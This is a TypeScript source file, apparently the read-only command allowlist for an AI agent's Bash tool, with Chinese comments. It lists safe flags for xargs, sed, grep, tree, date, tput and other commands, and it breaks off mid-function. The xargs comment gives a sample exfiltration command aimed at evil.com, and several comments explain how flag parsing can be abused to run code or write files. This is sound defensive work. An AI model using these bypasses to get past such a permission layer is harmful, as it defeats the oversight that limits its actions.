import type { z } from 'zod/v4'
import { getOriginalCwd } from '../../bootstrap/state.js'
import {
  extractOutputRedirections,
  splitCommand_DEPRECATED,
} from '../../utils/bash/commands.js'
import { tryParseShellCommand } from '../../utils/bash/shellQuote.js'
import { getCwd } from '../../utils/cwd.js'
import { isCurrentDirectoryBareGitRepo } from '../../utils/git.js'
import type { PermissionResult } from '../../utils/permissions/PermissionResult.js'
import { getPlatform } from '../../utils/platform.js'
import { SandboxManager } from '../../utils/sandbox/sandbox-adapter.js'
import {
  containsVulnerableUncPath,
  DOCKER_READ_ONLY_COMMANDS,
  EXTERNAL_READONLY_COMMANDS,
  type FlagArgType,
  GH_READ_ONLY_COMMANDS,
  GIT_READ_ONLY_COMMANDS,
  PYRIGHT_READ_ONLY_COMMANDS,
  RIPGREP_READ_ONLY_COMMANDS,
  validateFlags,
} from '../../utils/shell/readOnlyCommandValidation.js'
import type { BashTool } from './BashTool.js'
import { isNormalizedGitCommand } from './bashPermissions.js'
import { bashCommandIsSafe_DEPRECATED } from './bashSecurity.js'
import {
  COMMAND_OPERATION_TYPE,
  PATH_EXTRACTORS,
  type PathCommand,
} from './pathValidation.js'
import { sedCommandIsAllowedByAllowlist } from './sedValidation.js'

// 统一命令验证配置系统
type CommandConfig = {
  // 从命令（如 `xargs` 或 `git diff`）到其安全标志及所接受值的映射记录
  safeFlags: Record<string, FlagArgType>
  // 可选的用于标志解析之外额外验证的正则表达式
  regex?: RegExp
  // 可选的额外自定义验证逻辑回调。若命令危险则返回 true，若安全则返回 false。
  // 旨在与基于 safeFlags 的验证配合使用。
  additionalCommandIsDangerousCallback?: (
    rawCommand: string,
    args: string[],
  ) => boolean
  // 当为 false 时，工具不遵守 POSIX `--` 选项结束符。
  // validateFlags 将在 `--` 之后继续检查标志，而不是中断。
  // 默认值: true（大多数工具遵守 `--`）。
  respectsDoubleDash?: boolean
}

// fd 和 fdfind（Debian/Ubuntu 包名）共享的安全标志
// 安全: -x/--exec 和 -X/--exec-batch 被故意排除 —
// 它们会对每个搜索结果执行任意命令。
const FD_SAFE_FLAGS: Record<string, FlagArgType> = {
  '-h': 'none',
  '--help': 'none',
  '-V': 'none',
  '--version': 'none',
  '-H': 'none',
  '--hidden': 'none',
  '-I': 'none',
  '--no-ignore': 'none',
  '--no-ignore-vcs': 'none',
  '--no-ignore-parent': 'none',
  '-s': 'none',
  '--case-sensitive': 'none',
  '-i': 'none',
  '--ignore-case': 'none',
  '-g': 'none',
  '--glob': 'none',
  '--regex': 'none',
  '-F': 'none',
  '--fixed-strings': 'none',
  '-a': 'none',
  '--absolute-path': 'none',
  // 安全: -l/--list-details 已排除 — 内部以子进程方式执行 `ls`（与
  // --exec-batch 相同路径）。若 PATH 中存在恶意 `ls`，则有 PATH 劫持风险。
  '-L': 'none',
  '--follow': 'none',
  '-p': 'none',
  '--full-path': 'none',
  '-0': 'none',
  '--print0': 'none',
  '-d': 'number',
  '--max-depth': 'number',
  '--min-depth': 'number',
  '--exact-depth': 'number',
  '-t': 'string',
  '--type': 'string',
  '-e': 'string',
  '--extension': 'string',
  '-S': 'string',
  '--size': 'string',
  '--changed-within': 'string',
  '--changed-before': 'string',
  '-o': 'string',
  '--owner': 'string',
  '-E': 'string',
  '--exclude': 'string',
  '--ignore-file': 'string',
  '-c': 'string',
  '--color': 'string',
  '-j': 'number',
  '--threads': 'number',
  '--max-buffer-time': 'string',
  '--max-results': 'number',
  '-1': 'none',
  '-q': 'none',
  '--quiet': 'none',
  '--show-errors': 'none',
  '--strip-cwd-prefix': 'none',
  '--one-file-system': 'none',
  '--prune': 'none',
  '--search-path': 'string',
  '--base-directory': 'string',
  '--path-separator': 'string',
  '--batch-size': 'number',
  '--no-require-git': 'none',
  '--hyperlink': 'string',
  '--and': 'string',
  '--format': 'string',
}

// 基于允许列表的命令验证集中配置
// 此处的所有命令和标志应仅允许读取文件。不得
// 允许写入文件、执行代码或发起网络请求。
const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
  xargs: {
    safeFlags: {
      '-I': '{}',
      // 安全: `-i` 和 `-e`（小写）已移除 — 两者均使用 GNU getopt
      // 可选附加参数语义（`i::`、`e::`）。参数必须
      // 紧附（`-iX`、`-eX`）；空格分隔（`-i X`、`-e X`）意味着
      // 该标志不接受参数，`X` 成为下一个位置参数（目标命令）。
      //
      // `-i`（`i::` — 可选的替换字符串）：
      //   echo /usr/sbin/sendm | xargs -it tail a@evil.com
      //   验证器: -it 打包（均为 'none'）通过，tail ∈ SAFE_TARGET → break
      //   GNU: -i replace-str=t, tail → /usr/sbin/sendmail → 网络外泄
      //
      // `-e`（`e::` — 可选的 eof 字符串）：
      //   cat data | xargs -e EOF echo foo
      //   验证器: -e 将 'EOF' 作为参数消费（类型 'EOF'），echo ∈ SAFE_TARGET
      //   GNU: -e 无附加参数 → 无 eof 字符串，'EOF' 成为目标命令
      //   → 从 PATH 执行名为 EOF 的二进制文件 → 代码执行（恶意仓库）
      //
      // 请改用大写 `-I {}`（强制参数）和 `-E EOF`（POSIX、强制参数）
      // — 验证器和 xargs 对参数消费方式一致。
      // `-i`/`-e` 已弃用（GNU: "请使用 -I 替代" / "请使用 -E 替代"）。
      '-n': 'number',
      '-P': 'number',
      '-L': 'number',
      '-s': 'number',
      '-E': 'EOF', // POSIX, MANDATORY separate arg — validator & xargs agree
      '-0': 'none',
      '-t': 'none',
      '-r': 'none',
      '-x': 'none',
      '-d': 'char',
    },
  },
  // 来自共享验证映射的所有 git 只读命令
  ...GIT_READ_ONLY_COMMANDS,
  file: {
    safeFlags: {
      // Output format flags
      '--brief': 'none',
      '-b': 'none',
      '--mime': 'none',
      '-i': 'none',
      '--mime-type': 'none',
      '--mime-encoding': 'none',
      '--apple': 'none',
      // Behavior flags
      '--check-encoding': 'none',
      '-c': 'none',
      '--exclude': 'string',
      '--exclude-quiet': 'string',
      '--print0': 'none',
      '-0': 'none',
      '-f': 'string',
      '-F': 'string',
      '--separator': 'string',
      '--help': 'none',
      '--version': 'none',
      '-v': 'none',
      // Following/dereferencing
      '--no-dereference': 'none',
      '-h': 'none',
      '--dereference': 'none',
      '-L': 'none',
      // Magic file options (safe when just reading)
      '--magic-file': 'string',
      '-m': 'string',
      // Other safe options
      '--keep-going': 'none',
      '-k': 'none',
      '--list': 'none',
      '-l': 'none',
      '--no-buffer': 'none',
      '-n': 'none',
      '--preserve-date': 'none',
      '-p': 'none',
      '--raw': 'none',
      '-r': 'none',
      '-s': 'none',
      '--special-files': 'none',
      // Uncompress flag for archives
      '--uncompress': 'none',
      '-z': 'none',
    },
  },
  sed: {
    safeFlags: {
      // Expression flags
      '--expression': 'string',
      '-e': 'string',
      // Output control
      '--quiet': 'none',
      '--silent': 'none',
      '-n': 'none',
      // Extended regex
      '--regexp-extended': 'none',
      '-r': 'none',
      '--posix': 'none',
      '-E': 'none',
      // Line handling
      '--line-length': 'number',
      '-l': 'number',
      '--zero-terminated': 'none',
      '-z': 'none',
      '--separate': 'none',
      '-s': 'none',
      '--unbuffered': 'none',
      '-u': 'none',
      // Debugging/help
      '--debug': 'none',
      '--help': 'none',
      '--version': 'none',
    },
    additionalCommandIsDangerousCallback: (
      rawCommand: string,
      _args: string[],
    ) => !sedCommandIsAllowedByAllowlist(rawCommand),
  },
  sort: {
    safeFlags: {
      // Sorting options
      '--ignore-leading-blanks': 'none',
      '-b': 'none',
      '--dictionary-order': 'none',
      '-d': 'none',
      '--ignore-case': 'none',
      '-f': 'none',
      '--general-numeric-sort': 'none',
      '-g': 'none',
      '--human-numeric-sort': 'none',
      '-h': 'none',
      '--ignore-nonprinting': 'none',
      '-i': 'none',
      '--month-sort': 'none',
      '-M': 'none',
      '--numeric-sort': 'none',
      '-n': 'none',
      '--random-sort': 'none',
      '-R': 'none',
      '--reverse': 'none',
      '-r': 'none',
      '--sort': 'string',
      '--stable': 'none',
      '-s': 'none',
      '--unique': 'none',
      '-u': 'none',
      '--version-sort': 'none',
      '-V': 'none',
      '--zero-terminated': 'none',
      '-z': 'none',
      // Key specifications
      '--key': 'string',
      '-k': 'string',
      '--field-separator': 'string',
      '-t': 'string',
      // Checking
      '--check': 'none',
      '-c': 'none',
      '--check-char-order': 'none',
      '-C': 'none',
      // Merging
      '--merge': 'none',
      '-m': 'none',
      // Buffer size
      '--buffer-size': 'string',
      '-S': 'string',
      // Parallel processing
      '--parallel': 'number',
      // Batch size
      '--batch-size': 'number',
      // Help and version
      '--help': 'none',
      '--version': 'none',
    },
  },
  man: {
    safeFlags: {
      // Safe display options
      '-a': 'none', // Display all manual pages
      '--all': 'none', // Same as -a
      '-d': 'none', // Debug mode
      '-f': 'none', // Emulate whatis
      '--whatis': 'none', // Same as -f
      '-h': 'none', // Help
      '-k': 'none', // Emulate apropos
      '--apropos': 'none', // Same as -k
      '-l': 'string', // Local file (safe for reading, Linux only)
      '-w': 'none', // Display location instead of content

      // Safe formatting options
      '-S': 'string', // Restrict manual sections
      '-s': 'string', // Same as -S for whatis/apropos mode
    },
  },
  // help 命令 — 仅允许 bash 内置 help 的标志，以防止 help
  // 被别名到 man 时的攻击（例如 oh-my-zsh 的 common-aliases 插件）。
  // man 的 -P 标志允许通过分页器执行任意命令。
  help: {
    safeFlags: {
      '-d': 'none', // Output short description for each topic
      '-m': 'none', // Display usage in pseudo-manpage format
      '-s': 'none', // Output only a short usage synopsis
    },
  },
  netstat: {
    safeFlags: {
      // 安全显示选项
      '-a': 'none', // 显示所有套接字
      '-L': 'none', // 显示监听队列大小
      '-l': 'none', // 打印完整 IPv6 地址
      '-n': 'none', // 以数字形式显示网络地址

      // 安全过滤选项
      '-f': 'string', // 地址族（inet、inet6、unix、vsock）

      // 安全接口选项
      '-g': 'none', // 显示多播组成员
      '-i': 'none', // 显示接口状态
      '-I': 'string', // 特定接口

      // 安全统计选项
      '-s': 'none', // 显示各协议统计信息

      // 安全路由选项
      '-r': 'none', // 显示路由表

      // 安全 mbuf 选项
      '-m': 'none', // 显示内存管理统计信息

      // 其他安全选项
      '-v': 'none', // 增加详细程度
    },
  },
  ps: {
    safeFlags: {
      // UNIX 风格进程选择（这些是安全的）
      '-e': 'none', // 选择所有进程
      '-A': 'none', // 选择所有进程（与 -e 相同）
      '-a': 'none', // 选择所有带 tty 的进程，不含会话领导
      '-d': 'none', // 选择所有进程，不含会话领导
      '-N': 'none', // 取反选择
      '--deselect': 'none',

      // UNIX 风格输出格式（安全，不显示环境变量）
      '-f': 'none', // 完整格式
      '-F': 'none', // 额外完整格式
      '-l': 'none', // 长格式
      '-j': 'none', // 作业格式
      '-y': 'none', // 不显示标志

      // 输出修饰符（安全的）
      '-w': 'none', // 宽输出
      '-ww': 'none', // 无限宽度
      '--width': 'number',
      '-c': 'none', // 显示调度器信息
      '-H': 'none', // 显示进程层级
      '--forest': 'none',
      '--headers': 'none',
      '--no-headers': 'none',
      '-n': 'string', // 设置名称列表文件
      '--sort': 'string',

      // 线程显示
      '-L': 'none', // 显示线程
      '-T': 'none', // 显示线程
      '-m': 'none', // 在进程后显示线程

      // 按条件选择进程
      '-C': 'string', // 按命令名
      '-G': 'string', // 按真实组 ID
      '-g': 'string', // 按会话或有效组
      '-p': 'string', // 按 PID
      '--pid': 'string',
      '-q': 'string', // 按 PID 快速模式
      '--quick-pid': 'string',
      '-s': 'string', // 按会话 ID
      '--sid': 'string',
      '-t': 'string', // 按 tty
      '--tty': 'string',
      '-U': 'string', // 按真实用户 ID
      '-u': 'string', // 按有效用户 ID
      '--user': 'string',

      // 帮助/版本
      '--help': 'none',
      '--info': 'none',
      '-V': 'none',
      '--version': 'none',
    },
    // 阻止显示环境变量的 BSD 风格 'e' 修饰符
    // BSD 选项是不带前导破折号的纯字母令牌
    additionalCommandIsDangerousCallback: (
      _rawCommand: string,
      args: string[],
    ) => {
      // 检查纯字母令牌中的 BSD 风格 'e'（不是 UNIX 风格的 -e）
      // BSD 风格选项是由字母组成的令牌（无前导破折号）且包含 'e'
      return args.some(
        a => !a.startsWith('-') && /^[a-zA-Z]*e[a-zA-Z]*$/.test(a),
      )
    },
  },
  base64: {
    respectsDoubleDash: false, // macOS base64 不遵守 POSIX --
    safeFlags: {
      // 安全解码选项
      '-d': 'none', // 解码
      '-D': 'none', // 解码（macOS）
      '--decode': 'none', // 解码

      // 安全格式化选项
      '-b': 'number', // 在 num 字符处换行（macOS）
      '--break': 'number', // 在 num 字符处换行（macOS）
      '-w': 'number', // 在 COLS 列处换行（Linux）
      '--wrap': 'number', // 在 COLS 列处换行（Linux）

      // 安全输入选项（从文件读取，非写入）
      '-i': 'string', // 输入文件（安全读取）
      '--input': 'string', // 输入文件（安全读取）

      // 安全杂项选项
      '--ignore-garbage': 'none', // 解码时忽略非字母字符（Linux）
      '-h': 'none', // 帮助
      '--help': 'none', // 帮助
      '--version': 'none', // 版本
    },
  },
  grep: {
    safeFlags: {
      // 模式标志
      '-e': 'string', // 模式
      '--regexp': 'string',
      '-f': 'string', // 包含模式的文件
      '--file': 'string',
      '-F': 'none', // 固定字符串
      '--fixed-strings': 'none',
      '-G': 'none', // 基本正则（默认）
      '--basic-regexp': 'none',
      '-E': 'none', // 扩展正则
      '--extended-regexp': 'none',
      '-P': 'none', // Perl 正则
      '--perl-regexp': 'none',

      // 匹配控制
      '-i': 'none', // 忽略大小写
      '--ignore-case': 'none',
      '--no-ignore-case': 'none',
      '-v': 'none', // 反向匹配
      '--invert-match': 'none',
      '-w': 'none', // 单词正则
      '--word-regexp': 'none',
      '-x': 'none', // 整行正则
      '--line-regexp': 'none',

      // 输出控制
      '-c': 'none', // 计数
      '--count': 'none',
      '--color': 'string',
      '--colour': 'string',
      '-L': 'none', // 无匹配的文件
      '--files-without-match': 'none',
      '-l': 'none', // 含匹配的文件
      '--files-with-matches': 'none',
      '-m': 'number', // 最大计数
      '--max-count': 'number',
      '-o': 'none', // 仅匹配部分
      '--only-matching': 'none',
      '-q': 'none', // 安静模式
      '--quiet': 'none',
      '--silent': 'none',
      '-s': 'none', // 无错误消息
      '--no-messages': 'none',

      // 输出行前缀
      '-b': 'none', // 字节偏移
      '--byte-offset': 'none',
      '-H': 'none', // 带文件名
      '--with-filename': 'none',
      '-h': 'none', // 无文件名
      '--no-filename': 'none',
      '--label': 'string',
      '-n': 'none', // 行号
      '--line-number': 'none',
      '-T': 'none', // 初始制表符
      '--initial-tab': 'none',
      '-u': 'none', // Unix 字节偏移
      '--unix-byte-offsets': 'none',
      '-Z': 'none', // 文件名后跟 NUL
      '--null': 'none',
      '-z': 'none', // NUL 数据
      '--null-data': 'none',

      // 上下文控制
      '-A': 'number', // 之后上下文行数
      '--after-context': 'number',
      '-B': 'number', // 之前上下文行数
      '--before-context': 'number',
      '-C': 'number', // 上下文行数
      '--context': 'number',
      '--group-separator': 'string',
      '--no-group-separator': 'none',

      // 文件和目录选择
      '-a': 'none', // 文本（将二进制作为文本处理）
      '--text': 'none',
      '--binary-files': 'string',
      '-D': 'string', // 设备
      '--devices': 'string',
      '-d': 'string', // 目录
      '--directories': 'string',
      '--exclude': 'string',
      '--exclude-from': 'string',
      '--exclude-dir': 'string',
      '--include': 'string',
      '-r': 'none', // 递归
      '--recursive': 'none',
      '-R': 'none', // 解引用递归
      '--dereference-recursive': 'none',

      // 其他选项
      '--line-buffered': 'none',
      '-U': 'none', // 二进制
      '--binary': 'none',

      // 帮助和版本
      '--help': 'none',
      '-V': 'none',
      '--version': 'none',
    },
  },
  ...RIPGREP_READ_ONLY_COMMANDS,
  // 校验和命令 — 这些仅读取文件并计算/验证哈希
  // 所有标志均安全，因为它们只影响输出格式或验证行为
  sha256sum: {
    safeFlags: {
      // 模式标志
      '-b': 'none', // 二进制模式
      '--binary': 'none',
      '-t': 'none', // 文本模式
      '--text': 'none',

      // 检查/验证标志
      '-c': 'none', // 从文件验证校验和
      '--check': 'none',
      '--ignore-missing': 'none', // 检查时忽略缺失文件
      '--quiet': 'none', // 检查时安静模式
      '--status': 'none', // 不输出，仅通过退出码表示成功
      '--strict': 'none', // 格式不正确的行返回非零退出码
      '-w': 'none', // 警告格式不正确的行
      '--warn': 'none',

      // 输出格式标志
      '--tag': 'none', // BSD 风格输出
      '-z': 'none', // 以 NUL 结束输出行
      '--zero': 'none',

      // 帮助和版本
      '--help': 'none',
      '--version': 'none',
    },
  },
  sha1sum: {
    safeFlags: {
      // 模式标志
      '-b': 'none', // 二进制模式
      '--binary': 'none',
      '-t': 'none', // 文本模式
      '--text': 'none',

      // 检查/验证标志
      '-c': 'none', // 从文件验证校验和
      '--check': 'none',
      '--ignore-missing': 'none', // 检查时忽略缺失文件
      '--quiet': 'none', // 检查时安静模式
      '--status': 'none', // 不输出，仅通过退出码表示成功
      '--strict': 'none', // 格式不正确的行返回非零退出码
      '-w': 'none', // 警告格式不正确的行
      '--warn': 'none',

      // 输出格式标志
      '--tag': 'none', // BSD 风格输出
      '-z': 'none', // 以 NUL 结束输出行
      '--zero': 'none',

      // 帮助和版本
      '--help': 'none',
      '--version': 'none',
    },
  },
  md5sum: {
    safeFlags: {
      // 模式标志
      '-b': 'none', // 二进制模式
      '--binary': 'none',
      '-t': 'none', // 文本模式
      '--text': 'none',

      // 检查/验证标志
      '-c': 'none', // 从文件验证校验和
      '--check': 'none',
      '--ignore-missing': 'none', // 检查时忽略缺失文件
      '--quiet': 'none', // 检查时安静模式
      '--status': 'none', // 不输出，仅通过退出码表示成功
      '--strict': 'none', // 格式不正确的行返回非零退出码
      '-w': 'none', // 警告格式不正确的行
      '--warn': 'none',

      // 输出格式标志
      '--tag': 'none', // BSD 风格输出
      '-z': 'none', // 以 NUL 结束输出行
      '--zero': 'none',

      // 帮助和版本
      '--help': 'none',
      '--version': 'none',
    },
  },
  // tree 命令 — 从 READONLY_COMMAND_REGEXES 迁移以支持标志和路径参数
  // -o/--output 会写入文件，因此已排除。所有其他标志均为显示/过滤选项。
  tree: {
    safeFlags: {
      // 列表选项
      '-a': 'none', // 所有文件
      '-d': 'none', // 仅目录
      '-l': 'none', // 跟随符号链接
      '-f': 'none', // 完整路径前缀
      '-x': 'none', // 停留在当前文件系统
      '-L': 'number', // 最大深度
      // 安全: -R 已移除。tree -R 结合 -H（HTML 模式）和 -L（深度）
      // 会向深度边界的每个子目录写入 00Tree.html 文件。
      // 根据 man tree（< 2.1.0）："-R — 在每个子目录再次执行 tree，
      // 并添加 `-o 00Tree.html` 作为新选项。" "在最大深度重新运行"
      // 的描述具有误导性——"重新运行"包含硬编码的 -o 文件写入。
      // `tree -R -H . -L 2 /path` → 向深度 2 的每个子目录写入
      // /path/<subdir>/00Tree.html。文件写入，零权限。
      '-P': 'string', // 包含模式
      '-I': 'string', // 排除模式
      '--gitignore': 'none',
      '--gitfile': 'string',
      '--ignore-case': 'none',
      '--matchdirs': 'none',
      '--metafirst': 'none',
      '--prune': 'none',
      '--info': 'none',
      '--infofile': 'string',
      '--noreport': 'none',
      '--charset': 'string',
      '--filelimit': 'number',
      // 文件显示选项
      '-q': 'none', // 不可打印字符显示为 ?
      '-N': 'none', // 不可打印字符原样显示
      '-Q': 'none', // 引用文件名
      '-p': 'none', // 权限
      '-u': 'none', // 所有者
      '-g': 'none', // 组
      '-s': 'none', // 大小（字节）
      '-h': 'none', // 人类可读大小
      '--si': 'none',
      '--du': 'none',
      '-D': 'none', // 最后修改时间
      '--timefmt': 'string',
      '-F': 'none', // 追加指示符
      '--inodes': 'none',
      '--device': 'none',
      // 排序选项
      '-v': 'none', // 版本排序
      '-t': 'none', // 按 mtime 排序
      '-c': 'none', // 按 ctime 排序
      '-U': 'none', // 不排序
      '-r': 'none', // 反向排序
      '--dirsfirst': 'none',
      '--filesfirst': 'none',
      '--sort': 'string',
      // 图形/输出选项
      '-i': 'none', // 无缩进线
      '-A': 'none', // ANSI 线条图形
      '-S': 'none', // CP437 线条图形
      '-n': 'none', // 无颜色
      '-C': 'none', // 颜色
      '-X': 'none', // XML 输出
      '-J': 'none', // JSON 输出
      '-H': 'string', // 带基础 HREF 的 HTML 输出
      '--nolinks': 'none',
      '--hintro': 'string',
      '--houtro': 'string',
      '-T': 'string', // HTML 标题
      '--hyperlink': 'none',
      '--scheme': 'string',
      '--authority': 'string',
      // 输入选项（从文件读取，非写入）
      '--fromfile': 'none',
      '--fromtabfile': 'none',
      '--fflinks': 'none',
      // 帮助和版本
      '--help': 'none',
      '--version': 'none',
    },
  },
  // date 命令 — 从 READONLY_COMMANDS 迁移，因为 -s/--set 可设置系统时间
  // 此外 -f/--file 可从文件读取日期并设置时间
  // 我们只允许安全显示选项
  date: {
    safeFlags: {
      // 显示选项（安全 — 不修改系统时间）
      '-d': 'string', // --date=STRING — 显示由 STRING 描述的时间
      '--date': 'string',
      '-r': 'string', // --reference=FILE — 显示文件的修改时间
      '--reference': 'string',
      '-u': 'none', // --utc — 使用 UTC
      '--utc': 'none',
      '--universal': 'none',
      // 输出格式选项
      '-I': 'none', // --iso-8601（可有可选参数，但 none 类型处理裸标志）
      '--iso-8601': 'string',
      '-R': 'none', // --rfc-email
      '--rfc-email': 'none',
      '--rfc-3339': 'string',
      // 调试/帮助
      '--debug': 'none',
      '--help': 'none',
      '--version': 'none',
    },
    // 未包含的危险标志（通过省略来阻止）：
    // -s / --set — 设置系统时间
    // -f / --file — 从文件读取日期（可用于批量设置时间）
    // 关键: MMDDhhmm[[CC]YY][.ss] 格式的 date 位置参数会设置系统时间
    // 使用回调验证位置参数以 + 开头（格式字符串如 +"%Y-%m-%d"）
    additionalCommandIsDangerousCallback: (
      _rawCommand: string,
      args: string[],
    ) => {
      // args 是 "date" 之后已解析的令牌
      // 需要参数的标志
      const flagsWithArgs = new Set([
        '-d',
        '--date',
        '-r',
        '--reference',
        '--iso-8601',
        '--rfc-3339',
      ])
      let i = 0
      while (i < args.length) {
        const token = args[i]!
        // 跳过标志及其参数
        if (token.startsWith('--') && token.includes('=')) {
          // 带 =value 的长标志，已消费
          i++
        } else if (token.startsWith('-')) {
          // 标志 — 检查是否接受参数
          if (flagsWithArgs.has(token)) {
            i += 2 // 跳过标志及其参数
          } else {
            i++ // 仅跳过标志
          }
        } else {
          // 位置参数 — 必须以 + 开头才是格式字符串
          // 其他任何内容（如 MMDDhhmm）都可能设置系统时间
          if (!token.startsWith('+')) {
            return true // 危险
          }
          i++
        }
      }
      return false // 安全
    },
  },
  // hostname 命令 — 从 READONLY_COMMANDS 迁移，因为位置参数可设置主机名
  // 此外 -F/--file 从文件设置主机名，-b/--boot 设置默认主机名
  // 我们只允许安全显示选项并阻止任何位置参数
  hostname: {
    safeFlags: {
      // 仅显示选项（安全）
      '-f': 'none', // --fqdn — 显示完全限定域名
      '--fqdn': 'none',
      '--long': 'none',
      '-s': 'none', // --short — 显示短名称
      '--short': 'none',
      '-i': 'none', // --ip-address
      '--ip-address': 'none',
      '-I': 'none', // --all-ip-addresses
      '--all-ip-addresses': 'none',
      '-a': 'none', // --alias
      '--alias': 'none',
      '-d': 'none', // --domain
      '--domain': 'none',
      '-A': 'none', // --all-fqdns
      '--all-fqdns': 'none',
      '-v': 'none', // --verbose
      '--verbose': 'none',
      '-h': 'none', // --help
      '--help': 'none',
      '-V': 'none', // --version
      '--version': 'none',
    },
    // 关键: 阻止任何位置参数 — 它们会设置主机名
    // 同时阻止 -F/--file、-b/--boot、-y/--yp/--nis（不在 safeFlags 中 = 被阻止）
    // 使用正则确保标志之后无位置参数
    regex: /^hostname(?:\s+(?:-[a-zA-Z]|--[a-zA-Z-]+))*\s*$/,
  },
  // info 命令 — 从 READONLY_COMMANDS 迁移，因为 -o/--output 会写入文件
  // 此外 --dribble 将按键记录写入文件，--init-file 加载自定义配置
  // 我们只允许安全显示/导航选项
  info: {
    safeFlags: {
      // 导航/显示选项（安全）
      '-f': 'string', // --file — 指定要读取的手册文件
      '--file': 'string',
      '-d': 'string', // --directory — 搜索路径
      '--directory': 'string',
      '-n': 'string', // --node — 指定节点
      '--node': 'string',
      '-a': 'none', // --all
      '--all': 'none',
      '-k': 'string', // --apropos — 搜索
      '--apropos': 'string',
      '-w': 'none', // --where — 显示位置
      '--where': 'none',
      '--location': 'none',
      '--show-options': 'none',
      '--vi-keys': 'none',
      '--subnodes': 'none',
      '-h': 'none',
      '--help': 'none',
      '--usage': 'none',
      '--version': 'none',
    },
    // 未包含的危险标志（通过省略来阻止）：
    // -o / --output — 将输出写入文件
    // --dribble — 将按键记录写入文件
    // --init-file — 加载自定义配置（潜在代码执行）
    // --restore — 从文件回放按键记录
  },

  lsof: {
    safeFlags: {
      '-?': 'none',
      '-h': 'none',
      '-v': 'none',
      '-a': 'none',
      '-b': 'none',
      '-C': 'none',
      '-l': 'none',
      '-n': 'none',
      '-N': 'none',
      '-O': 'none',
      '-P': 'none',
      '-Q': 'none',
      '-R': 'none',
      '-t': 'none',
      '-U': 'none',
      '-V': 'none',
      '-X': 'none',
      '-H': 'none',
      '-E': 'none',
      '-F': 'none',
      '-g': 'none',
      '-i': 'none',
      '-K': 'none',
      '-L': 'none',
      '-o': 'none',
      '-r': 'none',
      '-s': 'none',
      '-S': 'none',
      '-T': 'none',
      '-x': 'none',
      '-A': 'string',
      '-c': 'string',
      '-d': 'string',
      '-e': 'string',
      '-k': 'string',
      '-p': 'string',
      '-u': 'string',
      // 已省略（写入磁盘）: -D（设备缓存文件构建/更新）
    },
    // 阻止 +m（创建挂载补充文件）— 写入磁盘。
    // +prefix 标志被 validateFlags 视为位置参数，
    // 因此我们必须在此处捕获它们。lsof 接受 +m<路径>（附加路径，无空格）
    // 包括绝对路径（+m/tmp/evil）和相对路径（+mfoo、+m.evil）。
    additionalCommandIsDangerousCallback: (_rawCommand, args) =>
      args.some(a => a === '+m' || a.startsWith('+m')),
  },

  pgrep: {
    safeFlags: {
      '-d': 'string', // 分隔符
      '--delimiter': 'string',
      '-l': 'none', // 列出名称
      '--list-name': 'none',
      '-a': 'none', // 列出完整命令行
      '--list-full': 'none',
      '-v': 'none', // 反向匹配
      '--inverse': 'none',
      '-w': 'none', // 轻量级输出
      '--lightweight': 'none',
      '-c': 'none', // 计数
      '--count': 'none',
      '-f': 'none', // 匹配完整命令行
      '--full': 'none',
      '-g': 'string', // 按进程组
      '--pgroup': 'string',
      '-G': 'string', // 按组名
      '--group': 'string',
      '-i': 'none', // 忽略大小写
      '--ignore-case': 'none',
      '-n': 'none', // 仅最新
      '--newest': 'none',
      '-o': 'none', // 仅最旧
      '--oldest': 'none',
      '-O': 'string', // 仅比指定秒数更旧的
      '--older': 'string',
      '-P': 'string', // 按父进程 ID
      '--parent': 'string',
      '-s': 'string', // 按会话 ID
      '--session': 'string',
      '-t': 'string', // 按终端
      '--terminal': 'string',
      '-u': 'string', // 按有效用户 ID
      '--euid': 'string',
      '-U': 'string', // 按用户 ID
      '--uid': 'string',
      '-x': 'none', // 精确匹配
      '--exact': 'none',
      '-F': 'string', // 从文件读取 PID
      '--pidfile': 'string',
      '-L': 'none', // 如果 PID 文件被锁定则失败
      '--logpidfile': 'none',
      '-r': 'string', // 按运行状态
      '--runstates': 'string',
      '--ns': 'string', // 按命名空间
      '--nslist': 'string',
      '--help': 'none',
      '-V': 'none',
      '--version': 'none',
    },
  },

  tput: {
    safeFlags: {
      '-T': 'string',
      '-V': 'none',
      '-x': 'none',
      // 安全: -S（从标准输入读取能力名称）被故意排除。
      // 它不得出现在 safeFlags 中，因为 validateFlags 会解包组合
      // 短标志（例如 -xS → -x + -S），但回调收到原始令牌
      // '-xS' 并仅检查精确匹配 'token === "-S"'。从 safeFlags 中
      // 排除 -S 确保 validateFlags 在回调运行之前就拒绝它（无论是否打包）。
      // 回调的 -S 检查是深度防御。
    },
    additionalCommandIsDangerousCallback: (
      _rawCommand: string,
      args: string[],
    ) => {
      // 修改终端状态或可能有害的能力。
      // init/reset 运行 iprog（来自 terminfo 的任意代码）并修改 tty 设置。
      // rs1/rs2/rs3/is1/is2/is3 是 init/reset 内部调用的各个重置/初始化序列
      // — rs1 发送 ESC c（完全终端重置）。
      // clear 清除回滚缓冲区（证据销毁）。mc5/mc5p 激活媒体复制
      // （将输出重定向到打印机设备）。smcup/rmcup 操作屏幕缓冲区。
      // pfkey/pfloc/pfx/pfxl 编程功能键 — pfloc 在本地执行字符串。
      // rf 是重置文件（类似于 if/init_file）。
      const DANGEROUS_CAPABILITIES = new Set([
        'init',  // 初始化终端（运行 iprog）
        'reset', // 重置终端（运行 iprog）
        'rs1',   // 重置序列 1
        'rs2',   // 重置序列 2
        'rs3',   // 重置序列 3
        'is1',   // 初始化序列 1
        'is2',   // 初始化序列 2
        'is3',   // 初始化序列 3
        'iprog', // 初始化程序（从 terminfo 执行任意代码）
        'if',    // 初始化文件
        'rf',    // 重置文件
        'clear', // 清除屏幕（销毁回滚缓冲区）
        'flash', // 终端闪烁
        'mc0',   // 打印屏幕内容
        'mc4',   // 关闭打印机
        'mc5',   // 启用打印机
        'mc5i',  // 启用打印机（透明）
        'mc5p',  // 打开打印机页面
        'pfkey', // 编程功能键
        'pfloc', // 编程本地功能键（执行字符串）
        'pfx',   // 编程功能键字符串
        'pfxl',  // 编程功能键字符串（长）
        'smcup', // 进入屏幕缓冲模式
        'rmcup', // 退出屏幕缓冲模式
      ])
      const flagsWithArgs = new Set(['-T'])
      let i = 0
      let afterDoubleDash = false
      while (i < args.length) {
        const token = args[i]!
        if (token === '--') {
          afterDoubleDash = true
          i++
        } else if (!afterDoubleDash && token.startsWith('-')) {
          // 深度防御: 即使 -S 以某种方式通过 validateFlags 也阻止它
          if (token === '-S') return true
          // 同时检查 -S 与其他标志打包（例如 -xS）
          if (
            !token.startsWith('--') &&
            token.length > 2 &&
            token.includes('S')
          )
            return true
          if (flagsWithArgs.has(token)) {
            i += 2
